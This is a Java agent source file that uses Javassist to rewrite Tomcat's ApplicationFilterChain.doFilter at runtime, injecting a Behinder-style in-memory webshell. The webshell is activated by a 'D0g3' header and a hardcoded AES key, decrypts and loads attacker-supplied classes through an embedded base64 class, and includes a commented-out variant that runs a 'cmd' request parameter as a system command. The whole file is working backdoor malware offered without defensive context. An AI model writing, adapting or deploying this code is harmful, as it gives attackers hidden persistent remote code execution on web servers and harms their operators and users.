package Shell;

import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;

import java.lang.instrument.ClassFileTransformer;
import java.lang.instrument.Instrumentation;
import java.security.ProtectionDomain;

public class TomcatAgentFilter {
    public static final String ClassName = "org.apache.catalina.core.ApplicationFilterChain";

    public static void agentmain(String agentArgs, Instrumentation ins) {
        ins.addTransformer(new DefineTransformer(),true);
        // 获取所有已加载的类
        Class[] classes = ins.getAllLoadedClasses();
        for (Class clas:classes){
            if (clas.getName().equals(ClassName)){
                try{
                    // 对类进行重新定义
                    ins.retransformClasses(new Class[]{clas});
                } catch (Exception e){
                    e.printStackTrace();
                }
            }
        }
    }
    public static class DefineTransformer implements ClassFileTransformer {

        public static final String ClassName = "org.apache.catalina.core.ApplicationFilterChain";

        public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) {
            className = className.replace("/",".");
            if (className.equals(ClassName)){
                System.out.println("Find the Inject Class: " + ClassName);
                ClassPool pool = ClassPool.getDefault();
                try {
                    CtClass c = pool.getCtClass(className);
                    CtMethod m = c.getDeclaredMethod("doFilter");
                    m.insertBefore("        String behinderShellHeader = \"D0g3\";\n" +
                            "        String behinderShellPwd = \"b9ecd0aebe82a741\"; // Crilwa\n" +
                            "        if(((HttpServletRequest)servletRequest).getHeader(behinderShellHeader) != null&&(((HttpServletRequest)servletRequest).getMethod().equals(\"POST\"))) {\n" +
                            "            //behind4 shell\n" +
                            "            try {\n" +
                            "                String k = behinderShellPwd;\n" +
                            "                HttpSession session = ((HttpServletRequest) servletRequest).getSession();\n" +
                            "                session.putValue(\"u\", k);\n" +
                            "                Cipher c = Cipher.getInstance(\"AES\");\n" +
                            "                c.init(2, new SecretKeySpec(k.getBytes(), \"AES\"));\n" +
                            "\n" +
                            "                HashMap map = new HashMap();\n" +
                            "                map.put(\"request\", servletRequest);\n" +
                            "                map.put(\"response\", servletResponse);\n" +
                            "                map.put(\"session\", session);\n" +
                            "\n" +
                            "                //取classloader\n" +
                            "                byte[] bytecode = java.util.Base64.getDecoder().decode(\"yv66vgAAADQAGgoABAAUCgAEABUHABYHABcBAAY8aW5pdD4BABooTGphdmEvbGFuZy9DbGFzc0xvYWRlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQADTFU7AQABYwEAF0xqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQABZwEAFShbQilMamF2YS9sYW5nL0NsYXNzOwEAAWIBAAJbQgEAClNvdXJjZUZpbGUBAAZVLmphdmEMAAUABgwAGAAZAQABVQEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgEAC2RlZmluZUNsYXNzAQAXKFtCSUkpTGphdmEvbGFuZy9DbGFzczsAIQADAAQAAAAAAAIAAAAFAAYAAQAHAAAAOgACAAIAAAAGKiu3AAGxAAAAAgAIAAAABgABAAAAAgAJAAAAFgACAAAABgAKAAsAAAAAAAYADAANAAEAAQAOAA8AAQAHAAAAPQAEAAIAAAAJKisDK763AAKwAAAAAgAIAAAABgABAAAAAwAJAAAAFgACAAAACQAKAAsAAAAAAAkAEAARAAEAAQASAAAAAgAT\");\n" +
                            "                ClassLoader cl = (ClassLoader) Thread.currentThread().getContextClassLoader();\n" +
                            "                java.lang.reflect.Method define = cl.getClass().getSuperclass().getSuperclass().getSuperclass().getDeclaredMethod(\"defineClass\", byte[].class, int.class, int.class);\n" +
                            "                define.setAccessible(true);\n" +
                            "                Class uclass = null;\n" +
                            "                try {\n" +
                            "                    uclass = cl.loadClass(\"U\");\n" +
                            "                } catch (ClassNotFoundException e) {\n" +
                            "                    uclass = (Class) define.invoke(cl, bytecode, 0, bytecode.length);\n" +
                            "                }\n" +
                            "\n" +
                            "                Constructor constructor = uclass.getDeclaredConstructor(ClassLoader.class);\n" +
                            "                constructor.setAccessible(true);\n" +
                            "                Object u = constructor.newInstance(this.getClass().getClassLoader());\n" +
                            "                Method Um = uclass.getDeclaredMethod(\"g\", byte[].class);\n" +
                            "                Um.setAccessible(true);\n" +
                            "\n" +
                            "                //冰蝎payload\n" +
                            "                byte[] evilClassBytes = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(servletRequest.getReader().readLine()));\n" +
                            "                Class evilclass = (Class) Um.invoke(u, evilClassBytes);\n" +
                            "                Object a = evilclass.newInstance();\n" +
                            "                Method b = evilclass.getDeclaredMethod(\"equals\", Object.class);\n" +
                            "                b.setAccessible(true);\n" +
                            "                b.invoke(a, map);\n" +
                            "            } catch (Exception e) {\n" +
                            "                // pass\n" +
                            "            }\n" +
                            "        }");
                    /*
                    m.insertBefore("javax.servlet.http.HttpServletRequest req =  request;\n" +
                            "javax.servlet.http.HttpServletResponse res = response;\n" +
                            "java.lang.String cmd = request.getParameter(\"cmd\");\n" +
                            "if (cmd != null){\n" +
                            "    try {\n" +
                            "        java.io.InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();\n" +
                            "        java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(in));\n" +
                            "        String line;\n" +
                            "        StringBuilder sb = new StringBuilder(\"\");\n" +
                            "        while ((line=reader.readLine()) != null){\n" +
                            "            sb.append(line).append(\"\\n\");\n" +
                            "        }\n" +
                            "        response.getOutputStream().print(sb.toString());\n" +
                            "        response.getOutputStream().flush();\n" +
                            "        response.getOutputStream().close();\n" +
                            "    } catch (Exception e){\n" +
                            "        e.printStackTrace();\n" +
                            "    }\n" +
                            "}");

                     */
                    byte[] bytes = c.toBytecode();
                    // 将 c 从 classpool 中删除以释放内存
                    c.detach();
                    return bytes;
                } catch (Exception e){
                    e.printStackTrace();
                }
            }
            return new byte[0];
        }
    }
}

